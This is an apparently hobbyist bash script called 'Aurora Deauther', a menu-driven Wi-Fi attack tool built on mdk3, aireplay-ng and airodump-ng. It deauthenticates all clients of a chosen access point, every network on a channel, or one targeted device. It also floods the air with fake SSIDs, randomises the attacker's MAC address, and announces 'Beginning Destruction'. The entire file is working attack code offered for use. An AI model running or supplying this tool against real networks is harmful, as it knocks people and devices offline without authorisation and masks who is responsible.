#!/bin/bash

# Name: Aurora Deauther
# Author: AuroraError


### Colours YAY! ###
BK=$(tput setaf 0) # Black
GR=$(tput setaf 2) # Green
RD=$(tput setaf 1) # Red
YW=$(tput setaf 3) # Yellow
CY=$(tput setaf 6) # Cyan
WH=$(tput setaf 7) # White
NT=$(tput sgr0) # Netral
BD=$(tput bold) # Bold
BG=$(tput setab 4) # Background Color

# root check

function root_chk () {
	if [[ $EUID -ne 0 ]]; then
		echo "This script must be run as root"
		exit 1
	fi
}
	
function banner () {
	printf "${BD}${WH}                                                     
 █████╗ ██╗   ██╗██████╗  ██████╗ ██████╗  █████╗ 
██╔══██╗██║   ██║██╔══██╗██╔═══██╗██╔══██╗██╔══██╗
███████║██║   ██║██████╔╝██║   ██║██████╔╝███████║
██╔══██║██║   ██║██╔══██╗██║   ██║██╔══██╗██╔══██║
██║  ██║╚██████╔╝██║  ██║╚██████╔╝██║  ██║██║  ██║
╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
                                                  
██████╗ ███████╗ █████╗ ██╗   ██╗████████╗██╗  ██╗
██╔══██╗██╔════╝██╔══██╗██║   ██║╚══██╔══╝██║  ██║
██║  ██║█████╗  ███████║██║   ██║   ██║   ███████║
██║  ██║██╔══╝  ██╔══██║██║   ██║   ██║   ██╔══██║
██████╔╝███████╗██║  ██║╚██████╔╝   ██║   ██║  ██║
╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝
	WiFi Deauther and AP Spammer by AuroraError

"
}

function banner2 () {
	printf "
${BD}${CY}
 @@@@@                                        @@@@@
@@@@@@@                                      @@@@@@@
@@@@@@@           @@@@@@@@@@@@@@@            @@@@@@@
 @@@@@@@@       @@@@@@@@@@@@@@@@@@@        @@@@@@@@
     @@@@@     @@@@@@@@@@@@@@@@@@@@@     @@@@@
       @@@@@  @@@@@@@@@@@@@@@@@@@@@@@  @@@@@
         @@  @@@@@@@@@@@@@@@@@@@@@@@@@  @@
            @@@@@@@    @@@@@@    @@@@@@
            @@@@@@      @@@@      @@@@@
            @@@@@@      @@@@      @@@@@
             @@@@@@    @@@@@@    @@@@@
              @@@@@@@@@@@  @@@@@@@@@@
               @@@@@@@@@@  @@@@@@@@@
           @@   @@@@@@@@@@@@@@@@@   @@
           @@@@  @@@A U R O R A@@@  @@@@
          @@@@@   @@D E A U T H@@   @@@@@
        @@@@@      @@@@@@@@@@@@@      @@@@@
      @@@@          @@@@@@@@@@@          @@@@
   @@@@@              @@@@@@@              @@@@@
  @@@@@@@                                 @@@@@@@
   @@@@@                                   @@@@@
 

"

}
banner2

function get_interface () {
	printf "${BD}${RD}Interface List ${WH}\n"
	printf ""
	interface=$(ifconfig -a | sed 's/[ \t].*//;/^$/d' | tr -d ':' > .iface.tmp)
	con=1
	for x in $(cat .iface.tmp); do
		printf "${WH}%s) ${GR}%s\n" $con $x
		let con++

	done
	echo -ne "\n${RD}Aurora${GR}@${RD}Deauth: ${WH}>> "; read iface
	selected_interface=$(sed ''$iface'q;d' .iface.tmp)
	IFS=$'\n'

}

function monitor_mode () {
	ifconfig $selected_interface down
	iwconfig $selected_interface mode monitor
	# Change MAC address
	macchanger -r $selected_interface
	ifconfig $selected_interface up
}

#deactivate monitor mode
function deactivate_monmode () {
	clear
	sleep 3
	ifconfig $selected_interface down
	macchanger -p $selected_interface
	iwconfig $selected_interface mode managed
	ifconfig $selected_interface up
	clear
	banner
	printf " ${BD}${WH}[${RD}*${WH}] ${RD}Deactivate Monitor Mode...\n"
	printf " ${BD}${WH}[${RD}*${WH}] ${RD}Goodbye... \n"
	rm -f .iface.tmp
	exit
}

function deactivate_2 () {
	clear
	sleep 3
	ifconfig $selected_interface down
	macchanger -p $selected_interface
	iwconfig $selected_interface mode managed
	ifconfig $selected_interface up
	nmcli device connect $selected_interface
	clear 
	banner
	printf " ${BD}${WH}[${RD}*${WH}] ${RD}Deactivate...\n"
	printf " ${BD}${WH}[${RD}*${WH}] ${RD}Goodbye...\n"
	rm -f .iface.tmp
	rm -f $rand_ssid"_list.txt"
	exit
}

### Menu ###
clear
root_chk
banner
printf " ${WH}1) ${GR}Deauth a Specific SSID\n"
printf " ${WH}2) ${GR}Deauth all Channels\n"
printf " ${WH}3) ${GR}Deauth a Specific Device on AP\n"
printf " ${WH}4) ${GR}AP Spam\n"
printf " ${WH}5) ${GR}Exit\n"
echo -ne "\n${RD}Aurora${GR}@${RD}Deauth: ${WH}>> "; read attack
clear

if [[ $attack == 1 ]]; then
	banner
	printf "${NT}\n"
	nmcli dev wifi
	echo " "
	echo -ne "${BD}[+]${WH} Enter the target BSSID > "
	read bssid
	clear
	banner
	get_interface
	clear
	banner2
	printf "			${WH}[ ${GR}Aurora Deauther ${WH}]\n"
	printf "		${WH}===== ${RD} Beginning Destruction ${WH}=====\n\n"
	monitor_mode >> /dev/null 2>&1
	trap deactivate_monmode EXIT ### CTRL+C to exit
	mdk3 $selected_interface d -t "$bssid"

elif [[ $attack == 2 ]]; then
	banner
	printf "${NT}\n"
	nmcli dev wifi
	echo " "
	echo -ne "${BD}[+]${WH} Enter the target Channel > "
	read CH
	clear
	banner
	get_interface
	clear
	banner2
	printf "			${WH}[ ${GR}Aurora Deauther ${WH}]\n"
	printf "		${WH}===== ${RD} Beginning Destruction ${WH}=====\n\n"
	monitor_mode >> /dev/null 2>&1
	trap deactivate_monmode EXIT ### CTRL+C to exit
	mdk3 $selected_interface d -c $CH

elif [[ $attack == 3 ]]; then
	banner
	monitor_mode >> /dev/null 2>&1
	nmcli dev wifi
	echo -ne "${BD}[+]${WH} Enter the BSSID of the target AP > "
	read bssid2
	echo -ne "${BD}[+]${WH} Enter the channel the AP is on > "
	read channel
	clear
	banner
	get_interface
	clear
	banner
	timeout --foreground -k 11 10 airodump-ng $selected_interface --bssid $bssid2 --channel $channel $1
	sleep 1
	banner
	echo -ne "${BD}[+]${WH} Enter the target MAC Address > "
	read target
	banner2
	printf "			${WH}[ ${GR}Aurora Deauther ${WH}]\n"
	printf "		${WH}===== ${RD} Beginning Destruction ${WH}=====\n\n"
	trap deactivate_monmode EXIT ### CTRL+C to exit
	airodump-ng $selected_interface --bssid $bssid2 --channel $channel $1 &> /dev/null &
	aireplay-ng $selected_interface --deauth 0 -a $bssid2 -c $target $1

elif [[ $attack == 4 ]]; then
	banner
	get_interface
	clear 
	banner
	printf "${WH}1) ${GR}Use default wordlist\n"
	printf "${WH}2) ${GR}Use custom wordlist\n"
	echo -ne "\n${RD}Aurora${GR}@${RD}Deauth: ${WH}>> "; read spm
	if [[ $spm == 1 ]]; then
		nmcli device disconnect $selected_interface >> /dev/null 2>&1
		clear
		banner2
		trap deactivate_2 EXIT #### CTRL+C to exit
		sleep 2
		printf "			${WH}[ ${GR}Aurora Deauther ${WH}]\n"
		printf "		${WH}===== ${RD} Beginning Destruction ${WH}=====\n\n"
		ifconfig $selected_interface down
		macchanger -r $selected_interface >> /dev/null 2>&1
		iwconfig $selected_interface mode monitor
		ifconfig $selected_interface up
		trap deactivate_2 EXIT ### CTRL+C to exit
		mdk3 $selected_interface b -f ssid_list.txt -a -s 1000
	elif [[ $spm == 2 ]]; then
		con=1
		nmcli device disconnect $AD > /dev/null 2>&1
		clear
		banner
		printf "\n${RD}Aurora${GR}@${RD}Deauth${WH}(SSID(Name of Network)) >> "; read rand_ssid;
		printf "\n${RD}Aurora${GR}@${RD}Deauth${WH}(How Many SSIDs) >> "; read con_ssid;
		for x in $(seq 1 $con_ssid); do
			echo "$rand_ssid $x" >> $rand_ssid"_list.txt"

		done
		wait
		clear
		banner2
		trap deactivate_2 EXIT ### CTRL+C to exit
		sleep 2
		printf "			${WH}[ ${GR}Aurora Deauther ${WH}]\n"
		printf "		${WH}===== ${RD} Beginning Destruction ${WH}=====\n\n"
		ifconfig $selected_interface down
		macchanger -r $selected_interface >> /dev/null 2>&1
		iwconfig $selected_interface mode monitor
		ifconfig $selected_interface up
		trap deactivate_2 EXIT
		mdk3 $selected_interface b -f $rand_ssid"_list.txt" -a -s 1000
	else
		printf " ${BD}${WH}[${RD}!${WH}] ${RD}Invalid Option ...\n"
		sleep 4
		trap deactivate_2 EXIT ### CTRL+C to exit
	fi
else
	printf " ${BD}${WH}[${RD}!${WH}] ${RD}Invalid Option ...\n"
	sleep 4
	trap deactivate_monmode EXIT ### CTRL+C to exit
fi
